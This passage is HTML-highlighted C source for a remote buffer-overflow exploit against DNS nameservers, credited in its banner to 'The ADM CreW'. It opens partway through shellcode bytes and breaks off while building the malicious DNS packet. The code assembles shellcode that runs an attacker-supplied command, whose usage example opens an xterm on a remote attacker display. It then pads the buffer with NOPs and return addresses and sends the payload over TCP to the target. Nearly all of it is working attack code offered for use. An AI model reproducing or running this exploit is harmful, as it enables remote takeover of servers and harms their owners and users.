</span><span class="sc6">"\xf2\x83\xc7\x04\xeb\xeb\x31\xc0\xab\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\x40"</span><span class="sc0">
</span><span class="sc6">"\xcd\x80\xe8\xc9\xff\xff\xff"</span><span class="sc10">;</span><span class="sc0">


</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">shellcode</span><span class="sc10">[</span><span class="sc4">500</span><span class="sc10">];</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> 
</span><span class="sc11">addchar</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">str</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">str</span><span class="sc10">[</span><span class="sc11">len</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">str</span><span class="sc10">[</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">void</span><span class="sc0"> 
</span><span class="sc11">usage</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">prog</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"--= The ADM CreW =--\n"</span><span class="sc0">
      </span><span class="sc6">"%s victim arg0 arg1 ...\n"</span><span class="sc0">
      </span><span class="sc6">"ex:sploits www.juergen.ch /usr/X11R6/bin/xterm"</span><span class="sc0">
      </span><span class="sc6">" -display ppp666.hax0r.com:0\n"</span><span class="sc0">
      </span><span class="sc10">,</span><span class="sc11">prog</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">main</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[];</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">ra</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">endbuff</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">jmp</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2700</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/* 2200 --&gt; 3500 */</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1536</span><span class="sc10">;</span><span class="sc0">


  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc6">"-h"</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc11">usage</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">

  </span><span class="sc11">strcpy</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\xeb"</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x32</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x32</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">addchar</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">jmp</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"1234"</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">basecode1</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x39</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x39</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">addchar</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">jmp</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">basecode2</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
      </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\xff"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\xfe"</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0xbffffff0</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"buffer size set to %i\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bsize</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"offset set to %i\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"using address: 0x%lx\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc11">endbuff</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">bsize</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">endbuff</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">NOP</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">shellcode</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc11">ptr</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">shellcode</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc10">*((</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">*((</span><span class="sc16">long</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">*(</span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">lookup_host</span><span class="sc0"> </span><span class="sc10">(&amp;</span><span class="sc11">ra</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">NAMESERVER_PORT</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">srand</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">time</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">attack_bind</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">lookup_host</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hn</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rp</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ra</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hn</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">short</span><span class="sc0"> </span><span class="sc11">rp</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">ra</span><span class="sc10">-&gt;</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">ra</span><span class="sc10">-&gt;</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rp</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">ra</span><span class="sc10">-&gt;</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hn</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">he</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">he</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyname</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hn</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">memcpy</span><span class="sc0"> </span><span class="sc10">(&amp;</span><span class="sc11">ra</span><span class="sc10">-&gt;</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">s_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc11">herror</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Unable to resolve hostname"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">attack_bind</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr_in</span><span class="sc0"> </span><span class="sc11">ra</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">keypkt</span><span class="sc10">[</span><span class="sc4">6000</span><span class="sc10">],</span><span class="sc0">  </span><span class="sc11">rname</span><span class="sc10">[</span><span class="sc4">6000</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">he</span><span class="sc10">;</span><span class="sc0">


  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">sd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">perror</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"cannot open tcp socket"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Connecting to nameserver via TCP.."</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fflush</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stdout</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">signal</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">handle_alarm</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">alarm</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">15</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ra</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">perror</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Unable to connect"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">close</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">".done.\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">alarm</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">he</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyaddr</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">ra</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">inet_ntoa</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ra</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc11">strncpy</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rname</span><span class="sc10">));</span><span class="sc0">



  </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">make_keypkt</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">keypkt</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">send_packet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">keypkt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"u hax0r\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">close</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sd</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">handle_alarm</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sn</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">alarm</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">signal</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SIGALRM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SIG_DFL</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">printf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc6">"Unable to connect: Connection timed out\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">make_keypkt</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pktbuf</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">HEADER</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dnsh</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pktbuf</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">pktlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ttl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">31337</span><span class="sc10">;</span><span class="sc0">


  </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pktbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">pktbuf</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc1">/* fill the dns header */</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HEADER</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">ptr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">id</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc0"> </span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">65535</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">dnsh</span><span class="sc10">-&gt;</span><span class="sc11">qr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
